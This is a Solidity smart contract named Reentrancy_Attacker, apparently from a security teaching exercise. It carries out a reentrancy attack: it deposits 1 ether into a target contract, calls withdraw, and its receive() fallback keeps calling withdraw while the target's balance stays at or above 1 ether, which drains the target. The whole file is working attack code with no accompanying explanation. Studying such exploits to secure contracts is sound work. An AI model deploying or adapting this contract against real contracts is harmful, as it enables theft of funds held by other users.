// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;

interface IReentrancy {
	function deposit() external payable;
	function withdraw() external;
}

contract Reentrancy_Attacker {
	IReentrancy vulnerable;

	constructor(address _vulnerable) payable {
		vulnerable = IReentrancy(_vulnerable);
	}

	function deposit() external {
		vulnerable.deposit{value: 1 ether}();
	}

	function startAttack() external {
		vulnerable.withdraw();
	}

	receive() external payable {
		if (address(vulnerable).balance >= 1 ether) {
			vulnerable.withdraw();
		}
	}
}
